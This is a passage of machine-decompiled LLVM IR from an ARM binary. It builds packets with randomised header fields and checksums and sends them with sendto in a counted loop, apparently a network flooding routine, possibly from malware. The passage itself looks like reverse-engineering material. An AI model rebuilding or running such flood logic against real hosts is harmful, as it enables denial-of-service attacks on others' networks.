  store i1 %v3_bca4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_bca4, label %dec_label_pc_bcb0, label %dec_label_pc_bab8

dec_label_pc_bab8:                                ; preds = %dec_label_pc_bc94.dec_label_pc_bab8_crit_edge, %dec_label_pc_baa4
  %v1_babc = phi i32 [ %v1_babc.pre, %dec_label_pc_bc94.dec_label_pc_bab8_crit_edge ], [ 65535, %dec_label_pc_baa4 ]
  store i32 %v3_b790, i32* %r1.global-to-local, align 4
  %v9_babc = icmp eq i32 %v3_b790, %v1_babc
  store i1 %v9_babc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_babc, label %dec_label_pc_bce8, label %dec_label_pc_bac4

dec_label_pc_bac4:                                ; preds = %dec_label_pc_bcb0.dec_label_pc_bac4_crit_edge, %dec_label_pc_bab8
  %v1_bac8 = phi i32 [ %v1_bac8.pre, %dec_label_pc_bcb0.dec_label_pc_bac4_crit_edge ], [ %v1_babc, %dec_label_pc_bab8 ]
  store i32 %v3_b794, i32* %r2.global-to-local, align 4
  %v9_bac8 = icmp eq i32 %v3_b794, %v1_bac8
  store i1 %v9_bac8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bac8, label %dec_label_pc_bd04, label %dec_label_pc_bad0

dec_label_pc_bad0:                                ; preds = %dec_label_pc_bce8, %dec_label_pc_bac4
  store i32 %v1_b784, i32* %r3.global-to-local, align 4
  store i1 %v2_bd14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bd14, label %dec_label_pc_bd28, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_bad0
  %v1_bad8 = load i32, i32* @r5, align 4
  %v2_bad8 = add i32 %v1_bad8, 16
  %v3_bad8 = inttoptr i32 %v2_bad8 to i32*
  %v4_bad8 = load i32, i32* %v3_bad8, align 4
  store i32 %v4_bad8, i32* %r3.global-to-local, align 4
  %v2_badc = load i32, i32* @r6, align 4
  %v3_badc = add i32 %v2_badc, 16
  %v4_badc = inttoptr i32 %v3_badc to i32*
  store i32 %v4_bad8, i32* %v4_badc, align 4
  br label %dec_label_pc_bae4

dec_label_pc_bae4:                                ; preds = %bb102, %.thread25, %dec_label_pc_bd28
  %v0_bae4 = call i32 @function_10bd8()
  store i32 %v0_bae4, i32* %r0.global-to-local, align 4
  store i32 %v0_bae4, i32* %stack_var_-44, align 4
  %v0_baec = call i32 @function_10bd8()
  store i32 %v0_baec, i32* %r0.global-to-local, align 4
  store i32 %v0_baec, i32* %stack_var_-48, align 4
  %v0_baf4 = call i32 @function_10bd8()
  store i32 %v2_baf8, i32* %r1.global-to-local, align 4
  store i32 %v0_baf4, i32* %stack_var_-52, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_bb04 = load i32, i32* @r8, align 4
  store i32 %v0_bb04, i32* %r0.global-to-local, align 4
  %v3_bb08 = call i32 @function_13ad0(i32 %v0_bb04, i32 %v2_baf8, i32 4)
  %v0_bb0c = load i32, i32* @r8, align 4
  %v1_bb0c = add i32 %v0_bb0c, 6
  store i32 %v1_bb0c, i32* %r0.global-to-local, align 4
  store i32 %v2_bb10, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_bb18 = call i32 @function_13ad0(i32 %v1_bb0c, i32 %v2_bb10, i32 4)
  %v0_bb1c = load i32, i32* @r8, align 4
  %v1_bb1c = add i32 %v0_bb1c, 4
  store i32 %v1_bb1c, i32* %r0.global-to-local, align 4
  store i32 %v2_bb20, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_bb28 = call i32 @function_13ad0(i32 %v1_bb1c, i32 %v2_bb20, i32 2)
  store i32 %v2_bb2c, i32* %r1.global-to-local, align 4
  %v0_bb30 = load i32, i32* @r8, align 4
  %v1_bb30 = add i32 %v0_bb30, 10
  store i32 %v1_bb30, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_bb38 = call i32 @function_13ad0(i32 %v1_bb30, i32 %v2_bb2c, i32 2)
  store i32 %v3_bb38, i32* %r0.global-to-local, align 4
  store i32 %v1_b6f4, i32* %r1.global-to-local, align 4
  store i1 %v2_bb40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bb40, label %dec_label_pc_bb48, label %dec_label_pc_bd34

dec_label_pc_bb48:                                ; preds = %dec_label_pc_bae4, %dec_label_pc_bd34
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_bb4c = load i32, i32* @sl, align 4
  %v1_bb4c = trunc i32 %v0_bb4c to i8
  %v2_bb4c = load i32, i32* @r5, align 4
  %v3_bb4c = add i32 %v2_bb4c, 10
  %v4_bb4c = inttoptr i32 %v3_bb4c to i8*
  store i8 %v1_bb4c, i8* %v4_bb4c, align 1
  %v0_bb50 = load i32, i32* @sl, align 4
  %v1_bb50 = trunc i32 %v0_bb50 to i8
  %v2_bb50 = load i32, i32* @r5, align 4
  %v3_bb50 = add i32 %v2_bb50, 11
  %v4_bb50 = inttoptr i32 %v3_bb50 to i8*
  store i8 %v1_bb50, i8* %v4_bb50, align 1
  %v0_bb54 = load i32, i32* @r5, align 4
  store i32 %v0_bb54, i32* @r0, align 4
  %v2_bb58 = call i32 @function_f19c(i32 %v0_bb54, i32 20)
  %v3_bb58 = trunc i32 %v2_bb58 to i8
  %v4_bb5c = sdiv i32 %v2_bb58, 256
  store i32 %v4_bb5c, i32* %r3.global-to-local, align 4
  %v1_bb60 = trunc i32 %v4_bb5c to i8
  %v2_bb60 = load i32, i32* @r5, align 4
  %v3_bb60 = add i32 %v2_bb60, 11
  %v4_bb60 = inttoptr i32 %v3_bb60 to i8*
  store i8 %v1_bb60, i8* %v4_bb60, align 1
  %v3_bb64 = load i32, i32* @r5, align 4
  %v4_bb64 = add i32 %v3_bb64, 10
  %v5_bb64 = inttoptr i32 %v4_bb64 to i8*
  store i8 %v3_bb58, i8* %v5_bb64, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_bb6c = load i32, i32* @sl, align 4
  %v1_bb6c = trunc i32 %v0_bb6c to i8
  %v2_bb6c = load i32, i32* @r6, align 4
  %v3_bb6c = add i32 %v2_bb6c, 10
  %v4_bb6c = inttoptr i32 %v3_bb6c to i8*
  store i8 %v1_bb6c, i8* %v4_bb6c, align 1
  %v0_bb70 = load i32, i32* @sl, align 4
  %v1_bb70 = trunc i32 %v0_bb70 to i8
  %v2_bb70 = load i32, i32* @r6, align 4
  %v3_bb70 = add i32 %v2_bb70, 11
  %v4_bb70 = inttoptr i32 %v3_bb70 to i8*
  store i8 %v1_bb70, i8* %v4_bb70, align 1
  %v0_bb74 = load i32, i32* @r6, align 4
  store i32 %v0_bb74, i32* @r0, align 4
  %v2_bb78 = call i32 @function_f19c(i32 %v0_bb74, i32 20)
  %v3_bb78 = trunc i32 %v2_bb78 to i8
  store i32 %v2_bb78, i32* %r0.global-to-local, align 4
  %v4_bb7c = sdiv i32 %v2_bb78, 256
  store i32 %v4_bb7c, i32* %r3.global-to-local, align 4
  %v3_bb80 = load i32, i32* @r6, align 4
  %v4_bb80 = add i32 %v3_bb80, 10
  %v5_bb80 = inttoptr i32 %v4_bb80 to i8*
  store i8 %v3_bb78, i8* %v5_bb80, align 1
  %v0_bb84 = load i32, i32* %r3.global-to-local, align 4
  %v1_bb84 = trunc i32 %v0_bb84 to i8
  %v2_bb84 = load i32, i32* @r6, align 4
  %v3_bb84 = add i32 %v2_bb84, 11
  %v4_bb84 = inttoptr i32 %v3_bb84 to i8*
  store i8 %v1_bb84, i8* %v4_bb84, align 1
  %v0_bb88 = load i32, i32* @r7, align 4
  %v1_bb88 = add i32 %v0_bb88, 4
  %v2_bb88 = inttoptr i32 %v1_bb88 to i8*
  %v3_bb88 = load i8, i8* %v2_bb88, align 1
  %v4_bb88 = zext i8 %v3_bb88 to i32
  store i32 %v4_bb88, i32* %r3.global-to-local, align 4
  %v1_bb8c = add i32 %v0_bb88, 5
  %v2_bb8c = inttoptr i32 %v1_bb8c to i8*
  %v3_bb8c = load i8, i8* %v2_bb8c, align 1
  %v4_bb8c = zext i8 %v3_bb8c to i32
  store i32 %v0_bb88, i32* @r1, align 4
  %v4_bb94 = mul nuw nsw i32 %v4_bb8c, 256
  %v5_bb94 = or i32 %v4_bb94, %v4_bb88
  store i32 %v5_bb94, i32* %r2.global-to-local, align 4
  %v0_bb98 = load i32, i32* @sl, align 4
  %v1_bb98 = trunc i32 %v0_bb98 to i8
  %v3_bb98 = add i32 %v0_bb88, 6
  %v4_bb98 = inttoptr i32 %v3_bb98 to i8*
  store i8 %v1_bb98, i8* %v4_bb98, align 1
  store i32 %stack_var_-156.0.ph, i32* %r3.global-to-local, align 4
  %v0_bba0 = load i32, i32* @sl, align 4
  %v1_bba0 = trunc i32 %v0_bba0 to i8
  %v2_bba0 = load i32, i32* @r7, align 4
  %v3_bba0 = add i32 %v2_bba0, 7
  %v4_bba0 = inttoptr i32 %v3_bba0 to i8*
  store i8 %v1_bba0, i8* %v4_bba0, align 1
  %v0_bba4 = load i32, i32* @r6, align 4
  store i32 %v0_bba4, i32* %r0.global-to-local, align 4
  %v4_bba8 = call i32 @function_f1f8(i32 %v0_bba4, i32 %v0_bb88, i32 %v5_bb94, i32 %stack_var_-156.0.ph)
  %v5_bba8 = trunc i32 %v4_bba8 to i8
  store i32 %v4_bba8, i32* %r0.global-to-local, align 4
  %v3_bbac = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_bbac, i32* %r3.global-to-local, align 4
  %v3_bbb0 = mul i32 %v3_bbac, 32
  store i32 %v3_bbb0, i32* %r2.global-to-local, align 4
  %v0_bbb4 = load i32, i32* @r5, align 4
  %v1_bbb4 = add i32 %v0_bbb4, 16
  %v2_bbb4 = inttoptr i32 %v1_bbb4 to i32*
  %v3_bbb4 = load i32, i32* %v2_bbb4, align 4
  store i32 %v3_bbb4, i32* %r1.global-to-local, align 4
  %v5_bbb8 = mul i32 %v3_bbac, 24
  store i32 %v5_bbb8, i32* %r2.global-to-local, align 4
  %v4_bbbc40 = udiv i32 %v4_bba8, 256
  %v1_bbc0 = trunc i32 %v4_bbbc40 to i8
  %v2_bbc0 = load i32, i32* @r7, align 4
  %v3_bbc0 = add i32 %v2_bbc0, 7
  %v4_bbc0 = inttoptr i32 %v3_bbc0 to i8*
  store i8 %v1_bbc0, i8* %v4_bbc0, align 1
  %v0_bbc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_bbc4 = load i32, i32* @sb, align 4
  %v2_bbc4 = add i32 %v1_bbc4, %v0_bbc4
  store i32 %v2_bbc4, i32* %lr.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_bbcc = load i32, i32* @r7, align 4
  %v4_bbcc = add i32 %v3_bbcc, 6
  %v5_bbcc = inttoptr i32 %v4_bbcc to i8*
  store i8 %v5_bba8, i8* %v5_bbcc, align 1
  %v0_bbd0 = load i32, i32* %r1.global-to-local, align 4
  %v1_bbd0 = load i32, i32* %lr.global-to-local, align 4
  %v2_bbd0 = add i32 %v1_bbd0, 4
  %v3_bbd0 = inttoptr i32 %v2_bbd0 to i32*
  store i32 %v0_bbd0, i32* %v3_bbd0, align 4
  %v0_bbd4 = load i32, i32* %r3.global-to-local, align 4
  %v1_bbd4 = trunc i32 %v0_bbd4 to i8
  %v2_bbd4 = load i32, i32* %r2.global-to-local, align 4
  %v3_bbd4 = load i32, i32* @sb, align 4
  %v4_bbd4 = add i32 %v3_bbd4, %v2_bbd4
  %v5_bbd4 = inttoptr i32 %v4_bbd4 to i8*
  store i8 %v1_bbd4, i8* %v5_bbd4, align 1
  %v0_bbd8 = load i32, i32* @sl, align 4
  %v1_bbd8 = trunc i32 %v0_bbd8 to i8
  %v2_bbd8 = load i32, i32* %lr.global-to-local, align 4
  %v3_bbd8 = add i32 %v2_bbd8, 2
  %v4_bbd8 = inttoptr i32 %v3_bbd8 to i8*
  store i8 %v1_bbd8, i8* %v4_bbd8, align 1
  %v0_bbdc = load i32, i32* @sl, align 4
  %v1_bbdc = trunc i32 %v0_bbdc to i8
  %v2_bbdc = load i32, i32* %lr.global-to-local, align 4
  %v3_bbdc = add i32 %v2_bbdc, 1
  %v4_bbdc = inttoptr i32 %v3_bbdc to i8*
  store i8 %v1_bbdc, i8* %v4_bbdc, align 1
  %v0_bbe0 = load i32, i32* @sl, align 4
  %v1_bbe0 = trunc i32 %v0_bbe0 to i8
  %v2_bbe0 = load i32, i32* %lr.global-to-local, align 4
  %v3_bbe0 = add i32 %v2_bbe0, 3
  %v4_bbe0 = inttoptr i32 %v3_bbe0 to i8*
  store i8 %v1_bbe0, i8* %v4_bbe0, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_bbec = load i32, i32* @r5, align 4
  store i32 %v0_bbec, i32* %r1.global-to-local, align 4
  store i32 %v3_b73c, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-160.0.ph, i32* %r2.global-to-local, align 4
  %v0_bbf8 = load i32, i32* %lr.global-to-local, align 4
  %v4_bbf8 = inttoptr i32 %v0_bbf8 to %sockaddr*
  %v7_bc00 = inttoptr i32 %v0_bbec to i32*
  %v9_bc00 = call i32 @sendto(i32 %v3_b73c, i32* %v7_bc00, i32 %stack_var_-160.0.ph, i32 16384, %sockaddr* %v4_bbf8, i32 16)
  %v3_bc04 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_bc04, i32* %r3.global-to-local, align 4
  %v1_bc08 = add i32 %v3_bc04, 1
  store i32 %v1_bc08, i32* %r0.global-to-local, align 4
  %v1_bc0c = load i32, i32* @fp, align 4
  %v9_bc0c = icmp eq i32 %v1_bc08, %v1_bc0c
  store i1 %v9_bc0c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bc08, i32* %stack_var_-40, align 4
  %v6_bc14 = icmp slt i32 %v1_bc08, %v1_bc0c
  br i1 %v6_bc14, label %dec_label_pc_ba6c, label %dec_label_pc_ba54

dec_label_pc_bc1c:                                ; preds = %dec_label_pc_b74c
  store i32 %v3_b73c, i32* %r0.global-to-local, align 4
  %v1_bc20 = call i32 @close(i32 %v3_b73c)
  store i32 %v1_bc20, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bc24

dec_label_pc_bc24:                                ; preds = %dec_label_pc_b5e8, %dec_label_pc_bc1c
  %v29_bc28 = phi i32 [ %v3_b73c, %dec_label_pc_b5e8 ], [ %v1_bc20, %dec_label_pc_bc1c ]
  store i32 %v3_b5e8, i32* %r4.global-to-local, align 4
  store i32 %v6_b5e8, i32* %r5.global-to-local, align 4
  store i32 %v9_b5e8, i32* %r6.global-to-local, align 4
  store i32 %v12_b5e8, i32* %r7.global-to-local, align 4
  store i32 %v15_b5e8, i32* %r8.global-to-local, align 4
  store i32 %v21_b5e8, i32* %sl.global-to-local, align 4
  ret i32 %v29_bc28

dec_label_pc_bc2c:                                ; preds = %dec_label_pc_ba6c
  %v1_bc2c = add i32 %v2_ba74, 16
  %v2_bc2c = inttoptr i32 %v1_bc2c to i32*
  %v3_bc2c = load i32, i32* %v2_bc2c, align 4
  store i32 %v3_bc2c, i32* %r4.global-to-local, align 4
  %v0_bc30 = call i32 @function_10bd8()
  store i32 %v0_bc30, i32* %r0.global-to-local, align 4
  %v3_bc34 = load i32, i32* %stack_var_-40, align 4
  %v5_bc3c = mul i32 %v3_bc34, 24
  %v0_bc40 = load i32, i32* %r4.global-to-local, align 4
  %v1_bc44 = load i32, i32* @sb, align 4
  %v2_bc44 = add i32 %v1_bc44, %v5_bc3c
  store i32 %v2_bc44, i32* %r1.global-to-local, align 4
  %v1_bc48 = and i32 %v0_bc40, ptrtoint (i32* @global_var_ff00.79 to i32)
  store i32 %v1_bc48, i32* %r3.global-to-local, align 4
  %v1_bc40 = udiv i32 %v0_bc40, 256
  %v3_bc4c = and i32 %v1_bc40, 65280
  store i32 %v3_bc4c, i32* %r2.global-to-local, align 4
  %v3_bc50 = mul i32 %v0_bc40, 16777216
  store i32 %v3_bc50, i32* %ip.global-to-local, align 4
  %v1_bc54 = add i32 %v2_bc44, 20
  %v2_bc54 = inttoptr i32 %v1_bc54 to i8*
  %v3_bc54 = load i8, i8* %v2_bc54, align 1
  %v4_bc54 = zext i8 %v3_bc54 to i32
  store i32 %v4_bc54, i32* %lr.global-to-local, align 4
  %v4_bc58 = mul i32 %v1_bc48, 256
  %v5_bc58 = or i32 %v4_bc58, %v3_bc50
  store i32 %v5_bc58, i32* %ip.global-to-local, align 4
  %v4_bc5c = udiv i32 %v0_bc40, 16777216
  %v5_bc5c = or i32 %v3_bc4c, %v4_bc5c
  %v2_bc60 = or i32 %v5_bc5c, %v5_bc58
  %v7_bc64 = lshr i32 %v0_bc30, %v4_bc54
  %v8_bc64 = add i32 %v7_bc64, %v2_bc60
  %v3_bc70 = mul i32 %v8_bc64, 16777216
  %v1_bc74 = and i32 %v8_bc64, 65280
  store i32 %v1_bc74, i32* %r0.global-to-local, align 4
  store i32 %v5_b728, i32* %r2.global-to-local, align 4
  %v4_bc80 = mul nuw nsw i32 %v1_bc74, 256
  %v5_bc80 = or i32 %v4_bc80, %v3_bc70
  store i32 %v5_bc80, i32* %r1.global-to-local, align 4
  %v2_bc84 = call i32 @llvm.bswap.i32(i32 %v8_bc64)
  store i32 %v2_bc84, i32* %r3.global-to-local, align 4
  store i1 %v7_ba9c, i1* %cpsr_z.global-to-local, align 1
  %v1_bc8c = load i32, i32* @r5, align 4
  %v2_bc8c = add i32 %v1_bc8c, 16
  %v3_bc8c = inttoptr i32 %v2_bc8c to i32*
  store i32 %v2_bc84, i32* %v3_bc8c, align 4
  br i1 %v2_ba9c, label %dec_label_pc_bc94, label %dec_label_pc_baa4

dec_label_pc_bc94:                                ; preds = %dec_label_pc_bc2c, %dec_label_pc_ba98
  %v0_bc94 = call i32 @function_10bd8()
  store i32 %v0_bc94, i32* %r0.global-to-local, align 4
  store i32 %v3_b78c, i32* %r3.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_bca4, i1* %cpsr_z.global-to-local, align 1
  %v1_bca8 = load i32, i32* @r5, align 4
  %v2_bca8 = add i32 %v1_bca8, 12
  %v3_bca8 = inttoptr i32 %v2_bca8 to i32*
  store i32 %v0_bc94, i32* %v3_bca8, align 4
  br i1 %v3_bca4, label %dec_label_pc_bcb0, label %dec_label_pc_bc94.dec_label_pc_bab8_crit_edge

dec_label_pc_bc94.dec_label_pc_bab8_crit_edge:    ; preds = %dec_label_pc_bc94
  %v1_babc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bab8

dec_label_pc_bcb0:                                ; preds = %dec_label_pc_bc94, %dec_label_pc_baa4
  %v0_bcb0 = call i32 @function_10bd8()
  %v3_bcb8 = urem i32 %v0_bcb0, 65536
  store i32 %v3_bcb8, i32* %r0.global-to-local, align 4
  %v1_bcc0 = sub nsw i32 999, %v3_bcb8
  store i32 %v1_bcc0, i32* %r2.global-to-local, align 4
  %v3_bcc4 = sdiv i32 %v1_bcc0, 256
  store i32 %v3_bcc4, i32* %r1.global-to-local, align 4
  %v3_bcc839 = udiv i32 %v3_bcb8, 256
  store i32 %v3_bcc839, i32* %r3.global-to-local, align 4
  %v1_bccc = trunc i32 %v3_bcc839 to i8
  %v2_bccc = load i32, i32* @r5, align 4
  %v3_bccc = add i32 %v2_bccc, 5
  %v4_bccc = inttoptr i32 %v3_bccc to i8*
  store i8 %v1_bccc, i8* %v4_bccc, align 1
  %v0_bcd0 = load i32, i32* %r0.global-to-local, align 4
  %v1_bcd0 = trunc i32 %v0_bcd0 to i8
  %v2_bcd0 = load i32, i32* @r5, align 4
  %v3_bcd0 = add i32 %v2_bcd0, 4
  %v4_bcd0 = inttoptr i32 %v3_bcd0 to i8*
  store i8 %v1_bcd0, i8* %v4_bcd0, align 1
  %v0_bcd4 = load i32, i32* %r1.global-to-local, align 4
  %v1_bcd4 = trunc i32 %v0_bcd4 to i8
  %v2_bcd4 = load i32, i32* @r6, align 4
  %v3_bcd4 = add i32 %v2_bcd4, 5
  %v4_bcd4 = inttoptr i32 %v3_bcd4 to i8*
  store i8 %v1_bcd4, i8* %v4_bcd4, align 1
  store i32 %v3_b790, i32* %r1.global-to-local, align 4
  %v1_bcdc = load i32, i32* @r4, align 4
  %v9_bcdc = icmp eq i32 %v3_b790, %v1_bcdc
  store i1 %v9_bcdc, i1* %cpsr_z.global-to-local, align 1
  %v0_bce0 = load i32, i32* %r2.global-to-local, align 4
  %v1_bce0 = trunc i32 %v0_bce0 to i8
  %v2_bce0 = load i32, i32* @r6, align 4
  %v3_bce0 = add i32 %v2_bce0, 4
  %v4_bce0 = inttoptr i32 %v3_bce0 to i8*
  store i8 %v1_bce0, i8* %v4_bce0, align 1
  %v0_bce4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bce4, label %dec_label_pc_bce8, label %dec_label_pc_bcb0.dec_label_pc_bac4_crit_edge

dec_label_pc_bcb0.dec_label_pc_bac4_crit_edge:    ; preds = %dec_label_pc_bcb0
  %v1_bac8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bac4

dec_label_pc_bce8:                                ; preds = %dec_label_pc_bcb0, %dec_label_pc_bab8
  %v0_bce8 = call i32 @function_10bd8()
  %v1_bce8 = trunc i32 %v0_bce8 to i8
  store i32 %v0_bce8, i32* %r0.global-to-local, align 4
  store i32 %v3_b794, i32* %r2.global-to-local, align 4
  %v4_bcf0 = sdiv i32 %v0_bce8, 256
  store i32 %v4_bcf0, i32* %r3.global-to-local, align 4
  %v1_bcf4 = load i32, i32* @r4, align 4
  %v9_bcf4 = icmp eq i32 %v3_b794, %v1_bcf4
  store i1 %v9_bcf4, i1* %cpsr_z.global-to-local, align 1
  %v3_bcf8 = load i32, i32* @r5, align 4
  %v4_bcf8 = add i32 %v3_bcf8, 58
  %v5_bcf8 = inttoptr i32 %v4_bcf8 to i8*
  store i8 %v1_bce8, i8* %v5_bcf8, align 1
  %v0_bcfc = load i32, i32* %r3.global-to-local, align 4
  %v1_bcfc = trunc i32 %v0_bcfc to i8
  %v2_bcfc = load i32, i32* @r7, align 4
  %v3_bcfc = add i32 %v2_bcfc, 1
  %v4_bcfc = inttoptr i32 %v3_bcfc to i8*
  store i8 %v1_bcfc, i8* %v4_bcfc, align 1
  %v0_bd00 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bd00, label %dec_label_pc_bd04, label %dec_label_pc_bad0

dec_label_pc_bd04:                                ; preds = %dec_label_pc_bce8, %dec_label_pc_bac4
  %v0_bd04 = call i32 @function_10bd8()
  %v1_bd04 = trunc i32 %v0_bd04 to i8
  store i32 %v0_bd04, i32* %r0.global-to-local, align 4
  %v4_bd0841 = udiv i32 %v0_bd04, 256
  %v1_bd0c = trunc i32 %v4_bd0841 to i8
  %v2_bd0c = load i32, i32* @r7, align 4
  %v3_bd0c = add i32 %v2_bd0c, 3
  %v4_bd0c = inttoptr i32 %v3_bd0c to i8*
  store i8 %v1_bd0c, i8* %v4_bd0c, align 1
  store i32 %v1_b784, i32* %r3.global-to-local, align 4
  store i1 %v2_bd14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bd14, label %bb101, label %bb100

bb100:                                            ; preds = %dec_label_pc_bd04
  %v1_bd18 = load i32, i32* @r5, align 4
  %v2_bd18 = add i32 %v1_bd18, 16
  %v3_bd18 = inttoptr i32 %v2_bd18 to i32*
  %v4_bd18 = load i32, i32* %v3_bd18, align 4
  store i32 %v4_bd18, i32* %r3.global-to-local, align 4
  br label %bb101

bb101:                                            ; preds = %dec_label_pc_bd04, %bb100
  %v3_bd1c = load i32, i32* @r7, align 4
  %v4_bd1c = add i32 %v3_bd1c, 2
  %v5_bd1c = inttoptr i32 %v4_bd1c to i8*
  store i8 %v1_bd04, i8* %v5_bd1c, align 1
  %v0_bd20 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bd20, label %dec_label_pc_bd28, label %bb102

bb102:                                            ; preds = %bb101
  %v1_bd20 = load i32, i32* %r3.global-to-local, align 4
  %v2_bd20 = load i32, i32* @r6, align 4
  %v3_bd20 = add i32 %v2_bd20, 16
  %v4_bd20 = inttoptr i32 %v3_bd20 to i32*
  store i32 %v1_bd20, i32* %v4_bd20, align 4
  br label %dec_label_pc_bae4

dec_label_pc_bd28:                                ; preds = %dec_label_pc_bad0, %bb101
  %v0_bd28 = call i32 @function_10bd8()
  store i32 %v0_bd28, i32* %r0.global-to-local, align 4
  %v1_bd2c = load i32, i32* @r6, align 4
  %v2_bd2c = add i32 %v1_bd2c, 16
  %v3_bd2c = inttoptr i32 %v2_bd2c to i32*
  store i32 %v0_bd28, i32* %v3_bd2c, align 4
  br label %dec_label_pc_bae4

dec_label_pc_bd34:                                ; preds = %dec_label_pc_bae4
  %v0_bd34 = load i32, i32* @r7, align 4
  %v1_bd34 = add i32 %v0_bd34, 8
  store i32 %v1_bd34, i32* %r0.global-to-local, align 4
  store i32 %v5_b6d4, i32* @r1, align 4
  %v1_bd3c = inttoptr i32 %v1_bd34 to i8*
  %v2_bd3c = call i32 @function_10db4(i8* %v1_bd3c)
  store i32 %v2_bd3c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bb48

dec_label_pc_bd44:                                ; preds = %dec_label_pc_b774
  %v1_bd4c = add i32 %v5_b6d4, 8
  store i32 %v1_bd4c, i32* %r1.global-to-local, align 4
  %v1_bd50 = add i32 %v5_b6d4, 66
  store i32 %v1_bd50, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ba54.preheader

; uselistorder directives
  uselistorder i32 %v1_bd50, { 1, 0 }
  uselistorder i32 %v1_bd4c, { 1, 0 }
  uselistorder i32 %v0_bd04, { 0, 2, 1 }
  uselistorder i32 %v0_bce8, { 0, 2, 1 }
  uselistorder i32 %v3_bcb8, { 0, 2, 1 }
  uselistorder i32 %v2_bc84, { 1, 0 }
  uselistorder i32 %v8_bc64, { 1, 2, 0 }
  uselistorder i32 %v3_bc50, { 1, 0 }
  uselistorder i32 %v0_bc40, { 1, 0, 2, 3 }
  uselistorder i32 %v1_bc0c, { 1, 2, 0 }
  uselistorder i32 %v1_bc08, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_bbac, { 1, 0, 2 }
  uselistorder i32 %v4_bba8, { 0, 2, 1 }
  uselistorder i32 %v0_bb88, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_bb78, { 0, 2, 1 }
  uselistorder i32 %v4_bb5c, { 1, 0 }
  uselistorder i32 %v7_ba80, { 2, 1, 0, 3 }
  uselistorder i32 %v0_ba54, { 1, 0 }
  uselistorder i1 %v7_ba9c, { 2, 1, 0 }
  uselistorder i1 %v2_bd14, { 2, 3, 1, 0 }
  uselistorder i1 %v3_bca4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_b9dc, { 1, 0, 2 }
  uselistorder i32 %v3_b844, { 1, 0 }
  uselistorder i32 %tmp89, { 1, 0 }
  uselistorder i32 %v1_b7e8, { 1, 0 }
  uselistorder i32 %v1_b7e4, { 2, 1, 0 }
  uselistorder i32 %v1_b7d0, { 1, 0 }
  uselistorder i32 %v1_b7cc, { 2, 1, 0 }
  uselistorder i32 %v1_b7c4, { 0, 2, 1 }
  uselistorder i32 %v3_b7bc, { 2, 1, 0 }
  uselistorder i32 %v0_b798, { 1, 0, 2 }
  uselistorder i32 %v3_b78c, { 2, 1, 3, 0 }
  uselistorder i32 %v1_b784, { 4, 3, 5, 1, 2, 0 }
  uselistorder i32 %v3_b780, { 2, 0, 1 }
  uselistorder i32 %v0_b780, { 2, 1, 0 }
  uselistorder i32 %v0_b778, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_b774, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_b76c, { 1, 0 }
  uselistorder i1 %v7_b740, { 1, 0 }
  uselistorder i32 %v3_b73c, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v5_b728, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_b6f4, { 1, 2, 0 }
  uselistorder i32 %v5_b6d4, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_b688, { 1, 0 }
  uselistorder i8 %v5_b678, { 1, 0 }
  uselistorder i32 %v5_b65c, { 1, 0 }
  uselistorder i32 %v6_b620, { 1, 0 }
  uselistorder i32 %v2_b608, { 0, 3, 1, 2 }
  uselistorder i32 %v1_b5ec, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 37, 39, 40, 42, 41, 43, 44, 46, 45, 48, 47, 0 }
